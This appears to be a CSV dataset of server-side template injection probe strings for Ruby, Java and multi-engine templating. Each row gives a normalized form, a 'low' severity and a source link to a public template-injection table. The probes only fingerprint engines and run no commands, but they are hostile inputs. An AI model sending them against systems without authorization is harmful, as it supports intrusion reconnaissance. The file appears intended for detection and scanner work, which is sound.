<#set($x<%={{={@{#{${xux}}%>),<#set($x<%={{={@{#{${xux}}%>),ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%%a%>,<%%a%>,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%-1-%>,<%-N-%>,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%= with almost everything before appended until (inclusive) <%={{={@{#{${xu}}%>,<%=withalmosteverythingbeforeappendeduntil(inclusive)<%={{={@{#{${xu}}%>,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>,<%=N%>,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>#{2},<%=N%>#{N},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>#{2}{{a}},<%=N%>#{N}{{a}},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>2{{a}},<%=N%>N{{a}},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>@*#1,<%=N%>@*#N,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>@*#{1},<%=N%>@*#{N},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>@*1,<%=N%>@*N,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%={{={@{#{${xu}}%>,<%={{={@{#{${xu}}%>,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%a%>,<%a%>,ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"<p>"">[[${{1}}]]</p>","<p>"">[[${{N}}]]</p>",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"<th:t=""${xu}#foreach.","<th:t=""${xu}#foreach.",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"<th:t=\""${xu}#foreach.< p=""""></th:t=\""${xu}#foreach.<>","<th:t=\""S""""S""${xu}#foreach.<>",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"a""&gt;##[[${1}]]","a""&gt;##[[${N}]]",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"a"">##[[$1]]","a"">##[[$N]]",unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"a"">##[[${1}]]","a"">##[[${N}]]",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"a"">##[[1]]","a"">##[[N]]",unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
a&quot;&gt;##[[${1}]],a&quot;&gt;##[[${N}]],java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"class=""ng-binding"">&lt;%=1%&gt;#{2}","class=""S"">&lt;%=N%&gt;#{N}",ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"class=""ng-binding"">p ""&gt;[[$1]]","class=""S"">p""&gt;[[$N]]",unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[$1]]","p"">[[$N]]",unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[$]]","p"">[[$]]",unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[${1}]]","p"">[[${N}]]",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[${{1}}]]","p"">[[${{N}}]]",java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[1]]","p"">[[N]]",unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[{1}]]","p"">[[{N}]]",unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
p &quot;&gt;[[$1]],p&quot;&gt;[[$N]],unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{##}/*#&lt;Mustache:0x00007f2c270be028&gt;*/,{##}/*#&lt;mustache:NxNfNcNbeN&gt;*/,unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{##}/*ARBITRARY*/,{##}/*arbitrary*/,unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{##}/*[object Object]*/,{##}/*[objectobject]*/,unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{#$1#}},{#$N#}},unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{#${{1}}#}},{#${{N}}#}},java,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{#1#}},{#N#}},unknown,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{#{1}#}},{#{N}#}},ruby,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{{1in[1]}},{{Nin[N]}},multi,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{{1}},{{N}},multi,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{{1}}@*,{{N}}@*,multi,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{{7}}},{{N}}},multi,unknown,1,low,probe,no,manual_review_pending (TInjA table extraction 2026-09-19),https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
